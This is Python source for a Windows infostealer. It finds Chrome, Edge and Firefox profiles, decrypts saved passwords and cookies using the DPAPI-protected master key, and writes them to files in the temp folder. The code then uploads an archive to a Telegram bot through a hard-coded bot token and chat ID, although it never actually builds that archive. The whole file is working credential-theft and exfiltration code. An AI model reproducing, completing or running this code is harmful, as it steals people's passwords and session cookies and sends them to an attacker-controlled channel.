import os
import json
import base64
import sqlite3
import shutil
import requests
import glob
import re
import zipfile
import io
import datetime
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

LocalAppData = os.getenv("LOCALAPPDATA")
AppData = os.getenv("APPDATA")
TMP = os.getenv("TEMP")
USR = TMP.split("\\AppData")[0]
PathBrowser = f"{TMP}\\Browsers Data"

TOKEN_BOT = "7943255077:AAEqR2NlZD4Qa_qHkibIVqMOoFVBh1BsHGI"
CHAT_ID_NEW = "-4530434524"

def installed_ch_dc_browsers():
    results = []
    ch_dc_browsers = {
        "Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
        "Firefox": f"{AppData}\\Mozilla\\Firefox",
        "Edge": f"{LocalAppData}\\Microsoft\\Edge\\User Data",
    }
    for browser, path in ch_dc_browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def get_ch_master_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_ch_value(buff, ch_master_key=None):
    try:
        starts = buff.decode(encoding="utf-8", errors="ignore")[:3]
        if starts in ["v10", "v11"]:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(ch_master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode()
    except:
        return None

def get_ch_login_data(browser, path, profile, ch_master_key):
    result = ""
    count = 0
    if not os.path.exists(f"{path}\\{profile}\\Login Data"):
        return count
    shutil.copy(f"{path}\\{profile}\\Login Data", TMP + "\\login_db")
    conn = sqlite3.connect(TMP + "\\login_db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        if row[0] and row[1]:
            password = decrypt_ch_value(row[2], ch_master_key)
            result += f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\nApplication: {browser} [Profile: {profile}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            count += 1
    if count > 0:
        if not os.path.exists(PathBrowser):
            os.makedirs(PathBrowser)
        with open(os.path.join(PathBrowser, f"All_Passwords.txt"), "a", encoding="utf-8") as f:
            f.writelines(result)
    conn.close()
    os.remove(TMP + "\\login_db")
    return count

def get_ch_cookies(browser, path, profile, ch_master_key):
    result = ""
    count = 0
    if not os.path.exists(f"{path}\\{profile}\\Network\\Cookies"):
        return count
    shutil.copy(f"{path}\\{profile}\\Network\\Cookies", TMP + "\\cookie_db")
    conn = sqlite3.connect(TMP + "\\cookie_db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    for row in cursor.fetchall():
        if row[0] and row[1]:
            cookie = decrypt_ch_value(row[2], ch_master_key)
            result += f"{row[0]}\t{row[1]}\t{cookie}\n"
            count += 1
    if count > 0:
        dir_path = os.path.join(PathBrowser, "Cookies Browser")
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        with open(os.path.join(dir_path, f"{browser}_{profile}.txt"), "w", encoding="utf-8") as f:
            f.writelines(result)
    conn.close()
    os.remove(TMP + "\\cookie_db")
    return count

def send_to_telegram(archive_path, message_body):
    with open(archive_path, "rb") as f:
        response = requests.post(
            f"https://api.telegram.org/bot{TOKEN_BOT}/sendDocument",
            params={"chat_id": CHAT_ID_NEW, "caption": message_body},
            files={"document": f}
        )
        response.raise_for_status()

available_path = installed_ch_dc_browsers()
total_ch_logins_count = 0
total_ch_cookies_count = 0

for browser in available_path:
    browser_path = {
        "Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
        "Firefox": f"{AppData}\\Mozilla\\Firefox",
        "Edge": f"{LocalAppData}\\Microsoft\\Edge\\User Data"
    }[browser]
    ch_master_key = get_ch_master_key(browser_path)
    profile_folders = glob.glob(os.path.join(browser_path, "Profile*"))
    for profile_folder in profile_folders:
        profile = os.path.basename(profile_folder)
        total_ch_logins_count += get_ch_login_data(browser, browser_path, profile, ch_master_key)
        total_ch_cookies_count += get_ch_cookies(browser, browser_path, profile, ch_master_key)

archive_path = os.path.join(TMP, "data.zip")
message_body = f"Total Logins: {total_ch_logins_count}\nTotal Cookies: {total_ch_cookies_count}"
send_to_telegram(archive_path, message_body)
